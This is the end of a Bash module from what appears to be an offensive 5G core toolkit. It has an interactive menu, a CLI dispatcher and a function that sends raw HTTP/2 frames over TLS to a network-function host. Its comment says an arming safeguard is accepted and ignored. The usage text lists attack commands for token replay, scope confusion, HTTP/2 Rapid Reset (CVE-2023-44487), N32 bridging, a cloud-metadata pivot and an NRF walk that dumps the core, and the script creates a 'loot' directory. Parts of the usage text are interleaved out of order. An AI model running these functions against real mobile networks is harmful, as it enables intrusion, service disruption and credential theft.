  [6]  SBI path reference
  [7]  Decode a JWT
  [8]  Audit a JWT
  [9]  Plan (handoff)
  [0]  back
M
        read -rp "  choice> " c || return 0
        case "$c" in
            1) sbap_h2_types; read -rp "  enter " _ ;;
            2) read -rp "  type> " t; read -rp "  flags> " fl; read -rp "  sid> " s; read -rp "  payload hex> " p
               sbap_h2_build "$t" "$fl" "$s" "$p"; echo; read -rp "  enter " _ ;;
            3) read -rp "  hex> " h; sbap_h2_parse "$h"; read -rp "  enter " _ ;;
            4) read -rp "  hex> " h; sbap_settings_parse "$h"; read -rp "  enter " _ ;;
            5) read -rp "  target NF type> " t; read -rp "  requester NF type> " r
               sbap_nrf_discovery "$t" "$r"; read -rp "  enter " _ ;;
            6) sbap_nf_paths; read -rp "  enter " _ ;;
            7) read -rp "  jwt> " t; sbap_jwt_decode "$t"; read -rp "  enter " _ ;;
            8) read -rp "  jwt> " t; read -rp "  expected aud> " a; sbap_jwt_audit "$t" "$a"; read -rp "  enter " _ ;;
            9) sbap_plan; read -rp "  enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── the last hop ────────────────────────────────────────────────────────
# The SBI is HTTP/2 over TLS on 443, and both halves matter: this file builds
# and parses the frames, tools/stream_assoc.py owns the socket.  It takes the
# octets whole on purpose -- a caller who hands it JSON and no framing gets a
# valid TLS record and an invalid HTTP/2 message, so the report says "framing
# none" rather than pretending to be a client.  No arming: SBA_ARMED is
# accepted and ignored and the request goes out on the first invocation.
sbap_cmd_sbi_send() {
    local host="${1:-}" port="${2:-443}" hex="${3:-}"
    local tool="$IMSISTING_ROOT/tools/stream_assoc.py"
    if [[ -z "$host" || -z "$hex" ]]; then
        printf 'ERROR\tneed <nf-host> [port] <framed-http2-hex>: this sends frames, it does not make them\n' >&2
        return 2
    fi
    [[ -f "$tool" ]] || { printf 'ERROR\t%s is missing; cannot send\n' "$tool" >&2; return 1; }
    printf 'leg\tSBI, HTTP/2 over TLS\n'
    printf 'target\t%s:%s\n' "$host" "$port"
    printf 'framing\tnone: the octets are sent as given, so they must already be HTTP/2 frames\n'
    if [[ "${SBI_PLAIN:-0}" == "1" ]]; then
        printf 'encapsulation\ttcp (SBI_PLAIN=1; never a real core)\n'
        timeout 30 python3 "$tool" send "$host" "$port" "$hex" --wait "${SBI_WAIT:-0}"
    else
        printf 'encapsulation\ttls\n'
        timeout 30 python3 "$tool" send "$host" "$port" "$hex" --tls \
            ${SBI_INSECURE:+--insecure} --wait "${SBI_WAIT:-0}"
    fi
}

sbap_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)  sbap_status_tsv ;;
        --h2-types)    sbap_h2_types ;;
        --h2-build)    sbap_h2_build "${1:-0}" "${2:-0}" "${3:-0}" "${4:-}" ;;
        --h2-parse)    sbap_h2_parse "${1:-}" ;;
        --sbi-send)    sbap_cmd_sbi_send "${1:-}" "${2:-443}" "${3:-}" ;;
        --settings)    sbap_settings_parse "${1:-}" ;;
        --hpack)       sbap_cmd_hpack "$@" ;;
        --nrf)         sbap_nrf_discovery "${1:-UDM}" "${2:-AMF}" ;;
        --nf-paths)    sbap_nf_paths ;;
        --jwt)         sbap_jwt_decode "${1:-}" ;;
        --jwt-audit)   sbap_jwt_audit "${1:-}" "${2:-}" ;;
        --token-pivot) sbap_token_pivot "${1:-}" "${2:-}" ;;
        --scope)       sbap_scope_confusion "${1:-}" "${2:-}" ;;
        --rapid-reset) sbap_rapid_reset "${1:-5}" ;;
        --n32-bridge)  sbap_n32_bridge "${1:-}" "${2:-AMF}" "${3:-001-01}" ;;
        --imds-pivot)  sbap_imds_pivot "${1:-SMF}" "${2:-}" ;;
        --nrf-walk)    sbap_nrf_walk "${1:-}" "${2:-AMF}" ;;
        --plan)        sbap_plan ;;
        --selftest)    sbap_selftest ;;
        --menu)        sbap_menu ;;
        *)
            cat >&2 <<EOF
5G SBA Pivot — HTTP/2 SBI framing, NRF discovery, OAuth2 token audit

Usage: $0 COMMAND
  --status-tsv          module state as TSV
  --h2-types            HTTP/2 frame type reference
  --h2-build <t> <flags> <sid> <payload_hex>
  --h2-parse <hex>      decode a 9-octet HTTP/2 header and length
  --settings <hex>      decode a SETTINGS payload
  --hpack <hex>...      decode HPACK header blocks (RFC 7541)
  --nrf <target> [requester]   NRF discovery request (TS 29.510)
  --nf-paths            SBI service path reference
  --jwt <token>         decode a JWT header and payload
  --jwt-audit <token> [expected_aud]
  --token-pivot <token> <target_nf>   cross-service token replay check
  --scope <token> <expected_scope>    scope-confusion check
  --rapid-reset <n>          HTTP/2 Rapid Reset frame sequence (CVE-2023-44487)
  --n32-bridge <home-api-root> [visiting-NF] [plmn]
  --imds-pivot [NF] [url]  C8: a registered callback that points the
  --nrf-walk [nrf-host] [requester]
                        C3: the thirteen discovery requests that
                        return the whole core as JSON
                        SBI client at the cloud metadata service
                        C2: what a visited network reaches over N32-f,
                        hop by hop, and which check would stop it
  --plan                SBA lab handoff plan
  --selftest            verify framing and token audit, no core needed
  --menu                interactive menu
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    sbap_cli_main "$@"
fi
